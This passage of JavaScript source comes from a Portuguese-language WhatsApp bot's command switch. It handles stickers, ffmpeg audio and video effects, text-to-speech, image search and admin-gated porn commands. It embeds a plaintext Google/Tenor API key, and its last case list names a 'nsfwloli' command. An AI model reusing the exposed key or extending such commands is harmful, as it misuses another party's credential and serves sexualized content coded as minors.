                pixx = `Olá ${pushname}, caso queira doar algum valor para meu criador, iria ajudar muito no desenvolvimento do bot o pix dele está logo abaixo *BANCO CECOIC* PARA MANOEL\n\nfd95bf02-1eff-4ea3-a325-c1d44a7dc629 [_chave Aleatoria_]`
                reply(pixx)
                break

            case 'sugestão':
            case 'sugestao':
                const sugestao = body.slice(10)
                if (args.length <= 1) return reply(`Exemplo: ${prefix}avalie "Bot muito bom, parabéns. "`)
                if (args.length >= 400) return reply('Máximo 400 caracteres')

                tdptlfs = `[ Sugestões ]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\n: ${sugestao}`

                await conn.sendMessage(`${setting.numerodono}@s.whatsapp.net`, { text: `${tdptlfs}`, "contextInfo": { mentionedJid: [sender] } }, { quoted: m })
                reply("mensagem enviada ao meu dono, obrigado pela sugestão, tentar ouvir o máximo possível de sugestões.")
                break

            case 'script':
                dlbot = `Olá ${pushname} caso queira obter a script desse bot 100% Descriptografada/código aberto editável, contate meu códer logo abaixo:\n\nhttps://wa.me/558198539583`
                reply(dlbot)
                break

            case 'idiomas':
            case 'idioma':
                txt = `  
    IDIOMAS DO GTTS OU DO TRADUTOR
    
    EXEMPLO :
    
    >> ${prefix}gtts pt (texto)
    
    >> ${prefix}traduzir pt/(texto)
    
    o PT que coloquei, é a linguagem, então pode por no lugar as 2 letras que define a linguagem, iguais os exemplos e os idiomas abaixo.
    
    'af': 'Afrikaans',
    'sq': 'Albanian',
    'ar': 'Arabic',
    'hy': 'Armenian',
    'ca': 'Catalan',
    'hr': 'Croatian',
    'cs': 'Czech',
    'da': 'Danish',
    'nl': 'Dutch',
    'en': 'English',
    'eo': 'Esperanto',
    'fi': 'Finnish',
    'fr': 'French',
    'de': 'German',
    'el': 'Greek',
    'ht': 'Haitian Creole',
    'hi': 'Hindi',
    'hu': 'Hungarian',
    'is': 'Icelandic',
    'id': 'Indonesian',
    'it': 'Italian',
    'ja': 'Japanese',
    'ko': 'Korean',
    'la': 'Latin',
    'lv': 'Latvian',
    'mk': 'Macedonian',
    'no': 'Norwegian',
    'pl': 'Polish',
    'pt': 'Portugues',
    'ro': 'Romanian',
    'ru': 'Russian',
    'sr': 'Serbian',
    'sk': 'Slovak',
    'es': 'Spanish',
    'sw': 'Swahili',
    'sv': 'Swedish',
    'ta': 'Tamil',
    'th': 'Thai',
    'tr': 'Turkish',
    'vi': 'Vietnamese',
    'cy': 'Welsh'
     
    🔥${setting.NomeDoBot}🔥`


                conn.sendMessage(from, { text: txt }, { quoted: selo })

                break

            case 'emojimix':
                if (!q) return reply(`Coloque o texto\nExemplo :\n${prefix + command} 🤩 👻`)

                emj = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(args[0])}_${encodeURIComponent(args[1])}`)
                if (emj.results.length < 1) return reply('Envie Uma Combinação Valido ex:  🤩 👻 ')
                for (let res of emj.results) {
                    conn.sendImageAsSticker(m.chat, res.url, m, { packname: criadorfig, author: descfig })
                }

                break

            case 'fig':
            case 'f':
            case 'figu':
            case 'figurinha':
            case 'sticker':
            case 's':
            case 'stickergif':
            case 'sgif': {


                if (!quoted) { return reply('mess.marqueimgsticker') } else {
                    if (/webp/.test(mime)) return m.reply('Você não pode marcar outra fig')

                    if (/image/.test(mime)) {
                        m.reply(enviar.espere)

                        let media = await quoted.download()
                        let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: criadorfig, author: descfig })
                        await fs.unlinkSync(encmedia)
                    } else if (/video/.test(mime)) {
                        m.reply(enviar.espere)

                        if ((quoted.msg || quoted).seconds > 11) return m.reply(mess.mxm10s)
                        let media = await quoted.download()
                        let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: criadorfig, author: descfig })
                        await fs.unlinkSync(encmedia)
                    } else {
                        return reply(mess.errofigu)
                    }
                }
            }


                break
            case 'figumeme':
                if (!quoted) return reply('Marque uma Imagem')
                if (!args[0]) return reply(`Use assim: ${prefix + command} texto1 texto2`)
                if (!args[1]) return reply(`Use assim: ${prefix + command} texto1 texto2`)
                if (/webp/.test(mime)) {
                    imgk = await conn.downloadAndSaveMediaMessage(quoted)
                    tl = await UploadFileUgu(imgk)
                    await fs.unlinkSync(imgk)
                    t1 = args[0].replace(/ /g, '%20').replace('\n', '%5Cn')
                    t2 = args[1].replace(/ /g, '%20').replace('\n', '%5Cn')
                    mmk = `https://api.memegen.link/images/custom/${t1 ? t1 : 'nada'}/${t2 ? t2 : 'nada'}.png?background=${util.format(tl.url)}`
                    conn.sendImageAsSticker(m.chat, mmk, m, { packname: criadorfig, author: descfig })
                    //reply(util.format(tl.url))
                } else if (/image/.test(mime)) {
                    imgk = await conn.downloadAndSaveMediaMessage(quoted)
                    tl = await UploadFileUgu(imgk)
                    await fs.unlinkSync(imgk)
                    t1 = args[0].replace(/ /g, '%20').replace('\n', '%5Cn')
                    t2 = args[1].replace(/ /g, '%20').replace('\n', '%5Cn')
                    mmk = `https://api.memegen.link/images/custom/${t1 ? t1 : 'nada'}/${t2 ? t2 : 'nada'}.png?background=${util.format(tl.url)}`
                    conn.sendImageAsSticker(m.chat, mmk, m, { packname: criadorfig, author: descfig })
                    //reply(util.format(tl.url))
                }

                break

            case 'figuc': {
                if (!quoted) return reply(`Responda uma imagem com ${prefix + command}`)
                if (!isQuotedImage) return reply('Marque uma imagem')

                reply(mess.wait)
                arquivom = await conn.downloadAndSaveMediaMessage(quoted)
                apil = await TelegraPh(arquivom)
                st1 = `https://p7api.xyz/api/canvas/circle?img=${util.format(apil)}&apikey=${setting.apikey}`
                await fs.unlinkSync(arquivom)
                conn.sendImageAsSticker(m.chat, st1, m, { packname: criadorfig, author: descfig })
            }
                break

            case 'figugay': {
                if (!quoted) return reply(`Responda uma imagem com ${prefix + command}`)
                if (!isQuotedImage) return reply('Marque uma imagem')

                reply(mess.wait)
                arquivom = await conn.downloadAndSaveMediaMessage(quoted)
                apil = await TelegraPh(arquivom)
                st2 = `https://p7api.xyz/api/canvas/gay?img=${util.format(apil)}&apikey=${setting.apikey}`
                await fs.unlinkSync(arquivom)
                conn.sendImageAsSticker(m.chat, st2, m, { packname: criadorfig, author: descfig })
            }
                break

            case 'figublur': {
                if (!quoted) return reply(`Responda uma imagem com ${prefix + command}`)
                if (!isQuotedImage) return reply('Marque uma imagem')

                reply(mess.wait)
                arquivom = await conn.downloadAndSaveMediaMessage(quoted)
                apil = await TelegraPh(arquivom)
                st3 = `https://p7api.xyz/api/canvas/blur?img=${util.format(apil)}&apikey=${setting.apikey}`
                await fs.unlinkSync(arquivom)
                conn.sendImageAsSticker(m.chat, st3, m, { packname: criadorfig, author: descfig })
            }
                break

            case 'figuinvert': {
                if (!quoted) return reply(`Responda uma imagem com ${prefix + command}`)
                if (!isQuotedImage) return reply('Marque uma imagem')

                reply(mess.wait)
                arquivom = await conn.downloadAndSaveMediaMessage(quoted)
                apil = await TelegraPh(arquivom)
                st4 = `https://p7api.xyz/api/canvas/invert?img=${util.format(apil)}&apikey=${setting.apikey}`
                await fs.unlinkSync(arquivom)
                conn.sendImageAsSticker(m.chat, st4, m, { packname: criadorfig, author: descfig })
            }
                break

            case 'figusepia': {
                if (!quoted) return reply(`Responda uma imagem com ${prefix + command}`)
                if (!isQuotedImage) return reply('Marque uma imagem')

                reply(mess.wait)
                arquivom = await conn.downloadAndSaveMediaMessage(quoted)
                apil = await TelegraPh(arquivom)
                st5 = `https://p7api.xyz/api/canvas/sepia?img=${util.format(apil)}&apikey=${setting.apikey}`
                await fs.unlinkSync(arquivom)
                conn.sendImageAsSticker(m.chat, st5, m, { packname: criadorfig, author: descfig })
            }
                break

            case 'figujail': {
                if (!quoted) return reply(`Responda uma imagem com ${prefix + command}`)
                if (!isQuotedImage) return reply('Marque uma imagem')

                reply(mess.wait)
                arquivom = await conn.downloadAndSaveMediaMessage(quoted)
                apil = await TelegraPh(arquivom)
                st6 = `https://p7api.xyz/api/canvas/jail?img=${util.format(apil)}&apikey=${setting.apikey}`
                await fs.unlinkSync(arquivom)
                conn.sendImageAsSticker(m.chat, st6, m, { packname: criadorfig, author: descfig })
            }
                break

            case 'figuger': {
                if (!quoted) return reply(`Responda uma imagem com ${prefix + command}`)
                if (!isQuotedImage) return reply('Marque uma imagem')

                reply(mess.wait)
                arquivom = await conn.downloadAndSaveMediaMessage(quoted)
                apil = await TelegraPh(arquivom)
                st7 = `https://p7api.xyz/api/canvas/triggered?img=${util.format(apil)}&apikey=${setting.apikey}`
                await fs.unlinkSync(arquivom)
                conn.sendImageAsSticker(m.chat, st7, m, { packname: criadorfig, author: descfig })
            }
                break
            case 'attp':
                if (c.length > 50) return reply('Vai escrever um texto é?, manda no maximo 50 caracteres')
                if (c.length < 1) return reply('Digite algo...')
                try {
                    conn.sendMessage(m.chat, { sticker: { url: 'https://hardianto.xyz/api/maker/attp?text=' + encodeURIComponent(text) + '&apikey=hardianto' } }, { quoted: m })

                } catch {

                    reply('Erro ao Fazer Attp.')

                }
                break


            case 'ffbusca': {
                try {
                    ff(q).then(__ => {
                        _ = __[Math.floor(Math.random() * __.length)]
                        infkk =
                            `
            ° Título : ${_.titulo}
            ° Publicado : ${_.publicado}
            ° Link : ${_.link}
            `
                        conn.sendMessage(m.chat, { image: { url: _.img }, caption: infkk }, { quoted: m })
                    })
                } catch { reply('Erro ao Obter Info') }
            }
                break
            case 'toimage':
            case 'toimg': {


                if (!quoted) return reply(mess.marquest)
                if (!/webp/.test(mime)) return reply(mess.marqueoarquivo)
                m.reply(enviar.espere)
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    conn.sendMessage(m.chat, { image: buffer, caption: mess.convertmsgimg }, { quoted: m })
                    fs.unlinkSync(ran)
                })

            }

                break

            case 'togif':
                if (!isQuotedSticker) return reply('*[ ❗ ] Marque a figurinha animada!*')
                if ((isMedia && !m.message.videoMessage || isQuotedSticker) && args.length == 0) {
                    buff = await getFileBuffer(m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
                    reply('*「 ❗ 」 Aguarde, convertendo a figurinha em gif...*')
                    a = await webp_mp4(buff)
                    mp4 = await getBuffer(a)
                    conn.sendMessage(from, { video: mp4, gifPlayback: true, filename: `stick.gif` }, { quoted: m })

                }
                break
            case 'tourl': {

                if (!quoted) return reply('Marca uma mensagem ou video')
                if (!isQuotedVideo && !isQuotedImage) return reply('Marque um vídeo ou imagem')


                m.reply(enviar.espere)
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu.url))
                } else { reply('erro ao torul tente novamente') }
                await fs.unlinkSync(media)
            }

                break

            case 'tourl2': {

                if (!quoted) return reply('Marca uma mensagem ou video')
                if (!isQuotedVideo && !isQuotedImage) return reply('Marque um vídeo ou imagem')
                post = isQuotedImage ? JSON.parse(JSON.stringify(m).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo.message.imageMessage : m

                m.reply(enviar.espere)
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    imagem = await downloadContentFromMessage(post, 'image')
                    base64 = Buffer.from([])
                    for await (const send of imagem) { base64 = Buffer.concat([base64, send]) }
                    linkou = await upload(base64)
                    m.reply(util.format(linkou))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu.url))
                } else { reply('erro ao torul tente novamente') }
                await fs.unlinkSync(media)
            }

                break
            case 'tourl3': {
                reply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    reply(util.format(anu.url))
                } else if (/video/.test(mime)) {
                    let media = await conn.downloadAndSaveMediaMessage(quoted)
                    let anu = await UploadFileUgu(media)
                    reply(util.format(anu.url))
                } else if (/webp/.test(mime)) {
                    let media = await conn.downloadAndSaveMediaMessage(quoted)
                    let anu = await UploadFileUgu(media)
                    reply(util.format(anu.result.url))
                }
                await fs.unlinkSync(media)
            }
                break


            case 'videocontrario':
            case 'reversevid':
                if (!isQuotedVideo) return reply('Marque um vídeo')
                reply(enviar.espere)
                encmediao = isQuotedVideo ? m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : m.message.videoMessage
                raneo = getRandom('.' + await getExtension(encmediao.mimetype))
                buffimg = await getFileBuffer(encmediao, 'video')
                fs.writeFileSync(raneo, buffimg)
                mediao = raneo
                ran = getRandom('.mp4')
                exec(`ffmpeg -i ${mediao} -vf reverse -af areverse ${ran}`, (err) => {
                    fs.unlinkSync(mediao)
                    if (err) return reply(`Err: ${err}`)
                    buffer453 = fs.readFileSync(ran)
                    conn.sendMessage(from, { video: buffer453, mimetype: 'video/mp4' }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                break

            case 'videolento':
            case 'slowvid':
                if (!isQuotedVideo) return reply('Marque um vídeo')
                reply(enviar.espere)
                encmediao = isQuotedVideo ? m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : m.message.videoMessage
                raneo = getRandom('.' + await getExtension(encmediao.mimetype))
                buffimg = await getFileBuffer(encmediao, 'video')
                fs.writeFileSync(raneo, buffimg)
                mediao = raneo
                ran = getRandom('.mp4')
                exec(`ffmpeg -i ${mediao} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
                    fs.unlinkSync(mediao)
                    if (err) return reply(`Err: ${err}`)
                    buffer453 = fs.readFileSync(ran)
                    conn.sendMessage(from, { video: buffer453, mimetype: 'video/mp4' }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                break
            case 'fastvideo':
            case 'videorapido':
            case 'fastvid':
                if (!isQuotedVideo) return reply('Marque um vídeo')
                reply(enviar.espere)
                encmediao = isQuotedVideo ? m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : m.message.videoMessage
                raneo = getRandom('.' + await getExtension(encmediao.mimetype))
                buffimg = await getFileBuffer(encmediao, 'video')
                fs.writeFileSync(raneo, buffimg)
                mediao = raneo
                ran = getRandom('.mp4')
                exec(`ffmpeg -i ${mediao} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
                    fs.unlinkSync(mediao)
                    if (err) return reply(`Err: ${err}`)
                    buffer453 = fs.readFileSync(ran)
                    conn.sendMessage(from, { video: buffer453, mimetype: 'video/mp4' }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                break

            case 'grave2':
                if (!isQuotedAudio) return reply('Marque um áudio')
                reply(enviar.espere)
                muk = isQuotedAudio ? m.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : m.message.audioMessage
                rane = getRandom('.' + await getExtension(muk.mimetype))
                buffimg = await getFileBuffer(muk, 'audio')
                fs.writeFileSync(rane, buffimg)
                gem = rane
                ran = getRandom('.mp3')
                exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(gem)
                    if (err) return reply('Error!')
                    hah = fs.readFileSync(ran)
                    conn.sendMessage(from, { audio: hah, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                break

            case 'grave':
                if (!isQuotedAudio) return reply('Marque um áudio')
                reply(enviar.espere)
                muk = isQuotedAudio ? m.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : m.message.audioMessage
                rane = getRandom('.' + await getExtension(muk.mimetype))
                buffimg = await getFileBuffer(muk, 'audio')
                fs.writeFileSync(rane, buffimg)
                gem = rane
                ran = getRandom('.mp3')
                exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(gem)
                    if (err) return reply('Error!')
                    hah = fs.readFileSync(ran)
                    conn.sendMessage(from, { audio: hah, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                break

            case 'adolesc':
            case 'vozmenino':
                if (!isQuotedAudio) return reply('Marque um áudio')
                reply(enviar.espere)
                muk = isQuotedAudio ? m.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : m.message.audioMessage
                rane = getRandom('.' + await getExtension(muk.mimetype))
                buffimg = await getFileBuffer(muk, 'audio')
                fs.writeFileSync(rane, buffimg)
                gem = rane
                ran = getRandom('.mp3')
                exec(`ffmpeg -i ${gem} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(gem)
                    if (err) return reply('Error!')
                    hah = fs.readFileSync(ran)
                    conn.sendMessage(from, { audio: hah, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                break

            case 'tomp3':
                if (!isQuotedVideo) return reply('Marque o video pfv')
                reply(enviar.espere)
                encmediao = isQuotedVideo ? m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : m.message.videoMessage
                rane = getRandom('.' + await getExtension(encmediao.mimetype))
                buffimg = await getFileBuffer(encmediao, 'video')
                fs.writeFileSync(rane, buffimg)
                mediao = rane
                ran = getRandom('.mp4')
                exec(`ffmpeg -i ${mediao} ${ran}`, (err) => {
                    fs.unlinkSync(mediao)
                    if (err) return reply('❌ Falha ao converter vídeo para mp3 ❌')
                    buffer = fs.readFileSync(ran)
                    conn.sendMessage(from, { audio: buffer, mimetype: 'audio/mp4' }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                break



            case 'bass3':
                if (!isQuotedAudio) return reply('Marque um áudio')
                reply(enviar.espere)
                muk = isQuotedAudio ? m.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : m.message.audioMessage
                rane = getRandom('.' + await getExtension(muk.mimetype))
                buffimg = await getFileBuffer(muk, 'audio')
                fs.writeFileSync(rane, buffimg)
                gem = rane
                ran = getRandom('.mp3')
                exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(gem)
                    if (err) return reply('Error!')
                    hah = fs.readFileSync(ran)
                    conn.sendMessage(from, { audio: hah, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                break

            case 'bass':
            case 'blown':
            case 'deep':
            case 'earrape':
            case 'fast':
            case 'fat':
            case 'nightcore':
            case 'reverse':
            case 'robot':
            case 'slow':
            case 'smooth':
            case 'tupai':
                try {
                    if (!isQuotedAudio) return reply('Marque um áudio')

                    let set
                    if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                    if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                    if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                    if (/earrape/.test(command)) set = '-af volume=12'
                    if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                    if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                    if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                    if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                    if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                    if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                    if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                    if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                    if (/audio/.test(mime)) {
                        reply(mess.wait)
                        let media = await conn.downloadAndSaveMediaMessage(quoted)
                        let ran = getRandom('.mp3')
                        exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                            fs.unlinkSync(media)
                            if (err) return reply(err)
                            let buff = fs.readFileSync(ran)
                            conn.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m })
                            fs.unlinkSync(ran)
                        })

                    } else reply(`Marque um áudio usando: *${prefix + command}*`)
                } catch (e) {
                    reply(e)
                }
                break

            case 'bass2':
                if (!isQuotedAudio) return reply('Marque um áudio')
                reply(enviar.espere)
                muk = isQuotedAudio ? m.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : m.message.audioMessage
                rane = getRandom('.' + await getExtension(muk.mimetype))
                buffimg = await getFileBuffer(muk, 'audio')
                fs.writeFileSync(rane, buffimg)
                gem = rane
                ran = getRandom('.mp3')
                exec(`ffmpeg -i ${gem} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(gem)
                    if (err) return reply('Error!')
                    hah = fs.readFileSync(ran)
                    conn.sendMessage(from, { audio: hah, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                break

            case 'estourar':
                if (!isQuotedAudio) return reply('Marque um áudio')
                reply(enviar.espere)
                muk = isQuotedAudio ? m.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : m.message.audioMessage
                rane = getRandom('.' + await getExtension(muk.mimetype))
                buffimg = await getFileBuffer(muk, 'audio')
                fs.writeFileSync(rane, buffimg)
                gem = rane
                ran = getRandom('.mp3')
                exec(`ffmpeg -i ${gem} -af equalizer=f=90:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(gem)
                    if (err) return reply('Error!')
                    hah = fs.readFileSync(ran)
                    conn.sendMessage(from, { audio: hah, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                break

            case 'esquilo':
                if (!isQuotedAudio) return reply('Marque um áudio')
                reply(enviar.espere)
                muk = isQuotedAudio ? m.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : m.message.audioMessage
                rane = getRandom('.' + await getExtension(muk.mimetype))
                buffimg = await getFileBuffer(muk, 'audio')
                fs.writeFileSync(rane, buffimg)
                gem = rane
                ran = getRandom('.mp3')
                exec(`ffmpeg -i ${gem} -filter:a "atempo=0.7,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(gem)
                    if (err) return reply('Error!')
                    hah = fs.readFileSync(ran)
                    conn.sendMessage(from, { audio: hah, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                break

            case 'audiolento':
            case 'slow':
                if (!isQuotedAudio) return reply('Marque um áudio')
                reply(enviar.espere)
                muk = isQuotedAudio ? m.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : m.message.audioMessage
                rane = getRandom('.' + await getExtension(muk.mimetype))
                buffimg = await getFileBuffer(muk, 'audio')
                fs.writeFileSync(rane, buffimg)
                gem = rane
                ran = getRandom('.mp3')
                exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(gem)
                    if (err) return reply('Error!')
                    hah = fs.readFileSync(ran)
                    conn.sendMessage(from, { audio: hah, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                break


            case 'gtts':
                if (args.length < 1) return conn.sendMessage(from, { text: `Cade o texto?, digite algo Exemplo:\n${prefix}gtts pt Oi` }, { quoted: m })
                const gtts = require('./lib/gtts')(args[0])
                if (args.length < 2) return conn.sendMessage(from, { text: 'Falta colocar o código do idioma!' }, { quoted: m })
                dtt = body.slice(8)
                ranm = getRandom('.mp3')
                rano = getRandom('.ogg')
                dtt.length > 500
                    ? reply('Para reduzir spam o máximo de letras permitidas são 500!')
                    : gtts.save(ranm, dtt, function () {
                        exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                            fs.unlinkSync(ranm)
                            buffer = fs.readFileSync(rano)
                            if (err) return reply('Falha')
                            conn.sendMessage(from, { audio: buffer, ptt: true }, { quoted: m })
                            fs.unlinkSync(rano)
                        })
                    })
                break
            case 'simivoz':
                linguagemmn = 'pt-br'
                try {
                    var IA2 = await fetchJson(`https://p7api.gustavonunes5.repl.co/api/?simi=${c}`)
                    if (IA2.success === 'please enter the text - text=hello') return m.reply('não entendi me faça uma pergunta que eu saiba :/')
                    const gttsi = require('./lib/gtts')(`${linguagemmn}`)

                    dtt = `${IA2.success}`
                    ranm = getRandom('.mp3')
                    rano = getRandom('.ogg')
                    dtt.length > 500
                        ? reply('Para reduzir spam o máximo de letras permitidas são 500!')
                        : gttsi.save(ranm, dtt, function () {
                            exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                                fs.unlinkSync(ranm)
                                buffer = fs.readFileSync(rano)
                                if (err) return reply('Falha')
                                conn.sendMessage(from, { audio: buffer, ptt: true }, { quoted: m })
                                fs.unlinkSync(rano)
                            })
                        })
                } catch { reply('Tente Novamente') }
                break



            case 'pinterest': {


                if (!c) return reply(mess.erro_c)
                m.reply(enviar.espere)
                anu = await pinterest(c)
                result = anu[Math.floor(Math.random(), anu.length)]
                conn.sendMessage(m.chat, { image: { url: result }, caption: c }, { quoted: m })
            }

                break



            case 'gimage':
            case 'googleimage':
            case 'img':
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm por causa de possiveis pesquisas de imagens pornograficas\nExemplo: ${prefix}nsfw`)

                if (args.length < 1) return reply('O que você deseja procurar?')
                console.log(color('[BUSCA IMG]', 'magenta'), color('[!] PROCURANDO A IMAGEM NO GOOGLE...', 'green'))
                reply(enviar.espere)
                teks = args.join(' ')
                try {
                    res = await googleImage(teks, google)
                    function google(error, result) {
                        if (error) { return reply('_[ ! ] Erro encontrado ou resultado não encontrado_') }
                        else {
                            gugIm = result
                            random = gugIm[Math.floor(Math.random() * gugIm.length)].url
                            conn.sendMessage(m.chat, { image: { url: random }, caption: `*Resultados da pesquisa de :* ${teks}\n Link: ${random}` }, { quoted: m })

                        }
                    }
                } catch { reply('tente novamente') }
                break

            case 'wikimedia': {


                if (!c) return reply(mess.erro_c)
                retri = c.replace(/[^a-zA-Z]/g, '')
                m.reply(enviar.espere)
                try {
                    anu = await wikimedia(retri)
                    result = anu[Math.floor(Math.random(), anu.length)]
                    conn.sendMessage(m.chat, { image: { url: result.image }, caption: `⊳ Título : ${result.title}\n⊳ Arquivo : ${result.source}\n⊳ Link da mídia : ${result.image}` }, { quoted: m })
                } catch { reply('erro tente novamente') }
            }

                break
            case 'porno':
            case 'porn':
            case 'bokep': {
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)


                m.reply(enviar.espere)
                anu = await porno()
                conn.sendMessage(m.chat, { video: { url: 'https://tikporntok.com/' + anu.video }, caption: `⊳ Título : ${anu.title}\n⊳ Visualizações : ${anu.views}\n⊳ Tags : ${anu.tags}\n⊳ Likes : ${anu.like}\n⊳ Deslikes : ${anu.dislike}\n⊳ Favoritos : ${anu.favorite}\n⊳ Data de upload : ${anu.upload}\n⊳ Descrição : ${anu.desc}\n⊳ Arquivo : https://tikporntok.com/${anu.source}` }, { quoted: m })
            }

                break
            case 'hentai': {
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)


                m.reply(enviar.espere)
                anu = await hentai()
                result = anu[Math.floor(Math.random(), anu.length)]
                conn.sendMessage(m.chat, { video: { url: result.video_1 }, caption: `⊳ Título : ${result.title}\n⊳ Categoria : ${result.category}\n⊳ Mimetype : ${result.type}\n⊳ Visualizações : ${result.views_count}\n⊳ Compartilhamentos : ${result.share_count}\n⊳ Arquivo : ${result.link}\n⊳ Link da mídia : ${result.video_1}` }, { quoted: m })
            }

                break

            case 'pornhubbusca':
            case 'pornohubbusca': {
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)

                try {
                    pornhub(q).then(__ => {
                        _ = __[Math.floor(Math.random() * __.length)]
                        infkk =
                            `
    ° Título : ${_.titulo}
    ° Autor : ${_.autor}
    ° Duração : ${_.duração}
    ° Qualidade : ${_.qualidade}
    ° Hype : ${_.hype}
    ° Visualizações : ${_.visualizações}
    ° Data de upload : ${_.data_upload}
    ° Link do vídeo : ${_.link}
    `
                        conn.sendMessage(m.chat, { image: { url: _.img }, caption: infkk }, { quoted: m })
                    })
                } catch { reply('Erro ao Obter Info') }
            }
                break

            case 'hentaitube': {
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)

                try {
                    hentaistube(q).then(__ => {
                        _ = __[Math.floor(Math.random() * __.length)]
                        infkk =
                            `
        ° Título : ${_.titulo}
        ° Link : ${_.link}
        `
                        conn.sendMessage(m.chat, { image: { url: _.img }, caption: infkk }, { quoted: m })
                    })
                } catch { reply('Erro ao Obter Info') }
            }
                break

            case 'sfwneko':
            case 'tentacles':
            case 'orgy':
            case 'yuri':
            case 'thighs':
            case 'nsfwloli':
            case 'femdom':
            case 'foot':
            case 'glasses':
            case 'jahy':
            case 'masturbation':
            case 'nsfwneko':
            case 'ero':
            case 'cum':
            case 'cuckold':
            case 'blowjob':
            case 'bdsm':
            case 'ass':
            case 'ahegao':
            case 'zettairyouiki':
